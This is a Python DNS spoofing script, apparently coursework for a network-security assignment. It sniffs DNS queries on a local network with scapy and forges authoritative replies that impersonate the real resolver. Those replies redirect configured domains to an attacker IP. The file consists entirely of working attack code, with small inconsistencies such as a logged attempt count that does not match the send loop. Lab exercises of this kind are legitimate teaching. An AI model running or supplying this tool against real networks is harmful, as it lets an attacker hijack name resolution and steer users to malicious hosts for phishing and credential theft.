"""
dns_spoof.py
Usage example:
 sudo python3 dns_spoof.py 
    -v 192.168.200.129 
    -c ./dns_spoof_config.json 
    -d 192.168.200.131 
    -t 192.168.200.128 
    -I eth0 
    -V
    
This is compliant with request from task 1 of DAT505 assignment 2
"""

from datetime import datetime
from scapy.all import *
import signal
import threading
import json
import fnmatch

CONFIG_PATH = "dns_spoof_config.json"
cfg = {
    "mode": "blacklist",            # "blacklist" or "whitelist"
    "domains": ["www.dat505.alberti"],   # list of domain patterns, e.g. ["*.local", "example.com"]
    "forward_non_target": False,
}

stop_event = threading.Event()
_sniff_thread = None

#TARGET_
#TARGET_DOMAIN = "www.dat505.alberti"
IFACE = "eth0"
#BPF_FILTER = f"udp port 53 and ip dst {}"
ATTACKER_IP = "192.168.200.128"
#dns server ip is the origin dns resolver id (for project we know is from)
#we set the packet source to this IP so client believes reply comes from this
DNS_SERVER_IP = "192.168.200.131"


def load_config(path=CONFIG_PATH):
    global cfg
    try:
        with open(path, "r") as f:
            user = json.load(f)
        # merge defaults with user config
        cfg.update(user)
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"Failed loading config {path}: {e}")

def match_domain_patterns(qname_str, patterns):
    q = qname_str.lower()
    for p in patterns:
        p_norm = p.lower().rstrip('.')
        if fnmatch.fnmatch(q, p_norm):
            return True
    return False

def should_spoof(qname_str):
    mode = cfg.get("mode", "blacklist").lower()
    patterns = cfg.get("domains", [])
    matched = match_domain_patterns(qname_str, patterns)
    if mode == "whitelist":
        return matched
    else:  # blacklist
        return not matched


def sigint_handler(signum, frame):
    stop_event.set()

def handle(pkt):
    if not (pkt.haslayer(Ether) and pkt.haslayer(IP) and pkt.haslayer(UDP)) :
        return

    # only process DNS queries
    if pkt[DNS].qr != 0:
        return

    # defensive: only act on queries for the specific domain and to the target DNS IP
    qname = pkt[DNSQR].qname  
    try:
        qname_str = qname.decode().rstrip('.')  
    except Exception:
        return

    if pkt[IP].dst != DNS_SERVER_IP:
        return
    
    do_spoof = should_spoof(qname_str)
    if not do_spoof:
       # if cfg.get("forward_non_target", False):
            #forward_and_reply_orig(pkt)
        return

    print(f"UDP detected with qname {pkt[DNSQR].qname.decode()}")
    print(f"Redirecting...")  
    
    qname = pkt[DNSQR].qname
    queried_dns_ip = pkt[IP].dst
    client_ip = pkt[IP].src
    client_port = pkt[IP].sport
    dns_id = pkt[DNS].id
    client_qd = pkt[DNS].qd
    my_mac = pkt[Ether].dst
    client_mac = pkt[Ether].src

    answer = DNSRR(rrname=qname, type='A', rdata=ATTACKER_IP, ttl=300)
    
    eth = Ether(src=my_mac, dst=client_mac)
    ip = IP(dst=client_ip, src=queried_dns_ip)
    udp = UDP(dport=client_port, sport=53)
    dns = DNS(id=dns_id,qr=1,aa=1,qd=client_qd, an=answer, ancount=1)
    send_path = eth / ip / udp / dns
    
    for _ in range(5):
        sendp(send_path, iface=IFACE, verbose=0)
        time.sleep(0.005)
    if args.verbose:
        print(f"[SENT] {datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]} | qname={qname.decode().rstrip('.')} | id={dns_id} | client={client_ip}:{client_port} | replied_as={queried_dns_ip}:53 | attacker_a={ATTACKER_IP} | iface={IFACE} | dst_mac={client_mac} | attempts=10")



def _sniff_worker():
    sniff(filter="udp port 53", prn=handle, store=0, iface=IFACE,
            stop_filter=lambda pkt: stop_event.is_set())


def start_sniffer():
    global _sniff_thread
    if _sniff_thread and _sniff_thread.is_alive():
        return
    stop_event.clear()
    _sniff_thread = threading.Thread(target=_sniff_worker, daemon=True)
    _sniff_thread.start()

def stop_sniffer(timeout=2):
    global _sniff_thread
    stop_event.set()
    if _sniff_thread:
        _sniff_thread.join(timeout)
        _sniff_thread = None


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS spoof tool - intercept dns")
    parser.add_argument("-v", "--victim", required=True, help="Victim IP (e.g. 192.168.200.129)")
    parser.add_argument("-V", "--verbose", action="store_true", help="Verbose mode")
    parser.add_argument("-c", "--config", required=True,  default="dns_spoof_config.json", help="Path to JSON config file")
    parser.add_argument("-d", "--dns-server", dest="dns_server", default=DNS_SERVER_IP, help="DNS server IP to impersonate")
    parser.add_argument("-t", "--attacker", dest="attacker_ip", default=ATTACKER_IP, help="Attacker IP to return in A records")
    parser.add_argument("-I", "--iface", dest="iface", default=IFACE, help="Network interface to use (e.g. eth0)")

    args = parser.parse_args()

    CONFIG_PATH = args.config
    DNS_SERVER_IP = args.dns_server
    ATTACKER_IP = args.attacker_ip
    IFACE = args.iface

    load_config()
    signal.signal(signal.SIGINT, sigint_handler)
    signal.signal(signal.SIGTERM, sigint_handler)

    print("Starting DNS spoofing")

    start_sniffer()
    stop_event.wait()
    stop_sniffer()
